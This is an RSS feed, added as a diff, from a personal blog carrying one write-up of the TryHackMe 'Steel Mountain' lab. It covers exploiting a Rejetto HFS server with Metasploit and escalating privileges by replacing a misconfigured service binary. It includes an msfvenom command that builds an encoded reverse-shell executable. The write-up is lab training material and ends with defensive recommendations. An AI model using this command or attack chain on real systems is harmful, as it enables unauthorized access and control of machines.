@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Tryhackme on Gabriel Tello</title>
+    <link>https://gtello.github.io/tags/tryhackme/</link>
+    <description>Recent content in Tryhackme on Gabriel Tello</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
+    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
+    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
+    <lastBuildDate>Tue, 12 Nov 2024 11:40:00 +0000</lastBuildDate>
+    <atom:link href="https://gtello.github.io/tags/tryhackme/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Steel Mountain (THM)</title>
+      <link>https://gtello.github.io/writeups/steelmountain/</link>
+      <pubDate>Tue, 12 Nov 2024 11:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/writeups/steelmountain/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup for the &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; machine on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Writeup for the <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> machine on TryHackMe.</p>
+<h2 id="summary">Summary</h2>
+<p>We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.</p>
+<p>After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>We started with a network scan using nmap to see which ports were open and what services were running on them.</p>
+<p><img alt="nmap Result" src="/images/posts/steelmountain/image1.png"></p>
+<center><em>Figure 1:</em> nmap result</center>
+<h3 id="reconnaissance-results">Reconnaissance Results</h3>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Operating System</th>
+          <th style="text-align: left">IP Address</th>
+          <th style="text-align: left">Open Ports</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Windows Server 2008</td>
+          <td style="text-align: left">10.10.128.109</td>
+          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="exploitation">Exploitation</h2>
+<p>When exploring port 80 in the browser, we found the Steel Mountain homepage with an &ldquo;Employee of the Month&rdquo; named Bill Harper (name taken from the image file). On port 8080, we discovered a Rejetto HTTP server that was exposed and vulnerable to a Remote Command Execution (RCE) exploit in HFS version 2.3.x. We used metasploit to launch the exploit and obtain a reverse shell connection to the server. The first flag was found on the user’s desktop.</p>
+<p><img alt="Steel Mountain Homepage" src="/images/posts/steelmountain/image2.png"></p>
+<center><em>Figure 2:</em> Steel Mountain Homepage</center>
+<p><img alt="Exposed Rejetto HTTP Server" src="/images/posts/steelmountain/image3.png"></p>
+<center><em>Figure 3:</em> Exposed Rejetto HTTP Server</center>
+<p><img alt="Shell Obtained in Metasploit" src="/images/posts/steelmountain/image4.png"></p>
+<center><em>Figure 4:</em> Shell obtained in metasploit</center>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>With initial access to the system, we ran the <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> script in PowerShell to identify potential configuration issues on the Windows system. The script detected that the <code>AdvancedSystemCareService9</code> service had misconfigured permissions:</p>
+<ul>
+<li>The service path was unquoted and included spaces, which is vulnerable on Windows.</li>
+<li>The service was set with modifiable permissions, allowing non-privileged users to make changes.</li>
+</ul>
+<p><img alt="Using PowerUp Script" src="/images/posts/steelmountain/image5.png"></p>
+<center><em>Figure 5:</em> Using PowerUp Script</center>
+<p>We created a reverse shell payload with msfvenom using the command:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>This command generated a <code>CleanupService.exe</code> executable with a reverse shell payload back to our machine. We uploaded this file to the server, replaced the legitimate service executable, and restarted it using <code>sc stop</code> and <code>sc start</code>, executing our payload and gaining administrator access.</p>
+<p><img alt="Executable Replaced" src="/images/posts/steelmountain/image6.png"></p>
+<center><em>Figure 6:</em> Executable replaced</center>
+<p>Once inside the system, we obtained the final flag.</p>
+<p><img alt="System Access" src="/images/posts/steelmountain/image7_1.png"><br>
+<img alt="Flag Obtained" src="/images/posts/steelmountain/image7_2.png"></p>
+<center><em>Figure 7:</em> Access to Administrator Account</center>
+<h2 id="tools-used">Tools Used</h2>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Tool</th>
+          <th style="text-align: left">Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">nmap</td>
+          <td style="text-align: left">For initial reconnaissance and detection of open ports and services.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">metasploit</td>
+          <td style="text-align: left">To launch the exploit against the Rejetto HTTP server.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">PowerUp.ps1</td>
+          <td style="text-align: left">PowerShell script for analyzing privilege configurations on Windows systems.</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">msfvenom</td>
+          <td style="text-align: left">To generate the reverse shell payload used to obtain administrator permissions.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusion">Conclusion</h2>
+<p>This machine was quite vulnerable, with poorly configured web services and insecure permissions in some services, which made both the initial access and privilege escalation relatively easy.</p>
+<h2 id="recommendations">Recommendations</h2>
+<p>To improve security:</p>
+<ol>
+<li>Restrict access to non-essential ports and limit access to trusted IPs.</li>
+<li>Update or replace the Rejetto HTTP server to close potential vulnerabilities.</li>
+<li>Review and adjust service configurations, ensuring paths are quoted and modification permissions are secure.</li>
+<li>Implement real-time monitoring and access control to detect any unauthorized activity on the system.</li>
+</ol>
+</div>]]></content:encoded>
+    </item>
+  </channel>
+</rss>
